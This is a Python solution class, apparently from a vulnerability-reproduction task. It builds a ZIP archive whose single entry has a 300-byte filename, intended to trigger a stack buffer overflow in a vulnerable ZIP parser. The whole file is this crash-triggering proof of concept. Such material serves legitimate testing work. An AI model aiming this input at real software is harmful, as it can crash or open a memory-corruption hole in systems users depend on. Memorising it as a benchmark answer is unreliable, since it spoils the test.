import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a ZIP file with a single entry whose filename length > 256
        # This should trigger the stack buffer overflow in the vulnerable version.
        filename_len = 300
        filename = b"A" * filename_len

        # Local file header
        # signature, version_needed, flags, compression, mod_time, mod_date,
        # crc32, comp_size, uncomp_size, fname_len, extra_len
        local_header = struct.pack(
            "<IHHHHHIIIHH",
            0x04034B50,  # Local file header signature
            20,          # Version needed to extract
            0,           # General purpose bit flag
            0,           # Compression method (0 = stored)
            0,           # Last mod file time
            0,           # Last mod file date
            0,           # CRC-32 (0 for empty content)
            0,           # Compressed size
            0,           # Uncompressed size
            len(filename),  # File name length
            0            # Extra field length
        )

        file_data = b""  # empty content

        local_file_record = local_header + filename + file_data
        local_header_offset = 0

        # Central directory file header
        # signature, version_made_by, version_needed, flags, compression,
        # mod_time, mod_date, crc32, comp_size, uncomp_size,
        # fname_len, extra_len, comment_len, disk_num_start,
        # internal_attr, external_attr, relative_offset
        central_dir_header = struct.pack(
            "<IHHHHHHIIIHHHHHII",
            0x02014B50,      # Central directory header signature
            20,              # Version made by
            20,              # Version needed to extract
            0,               # General purpose bit flag
            0,               # Compression method
            0,               # Last mod file time
            0,               # Last mod file date
            0,               # CRC-32
            0,               # Compressed size
            0,               # Uncompressed size
            len(filename),   # File name length
            0,               # Extra field length
            0,               # File comment length
            0,               # Disk number start
            0,               # Internal file attributes
            0,               # External file attributes
            local_header_offset  # Relative offset of local header
        )

        central_dir_record = central_dir_header + filename
        central_dir_size = len(central_dir_record)
        central_dir_offset = len(local_file_record)

        # End of central directory record
        # signature, disk_num, disk_with_cd, entries_on_disk, total_entries,
        # size_of_cd, offset_of_cd, comment_len
        eocd = struct.pack(
            "<IHHHHIIH",
            0x06054B50,  # End of central directory signature
            0,           # Number of this disk
            0,           # Number of the disk with the start of the central directory
            1,           # Total number of entries in the central directory on this disk
            1,           # Total number of entries in the central directory
            central_dir_size,   # Size of the central directory
            central_dir_offset, # Offset of start of central directory
            0            # ZIP file comment length
        )

        return local_file_record + central_dir_record + eocd
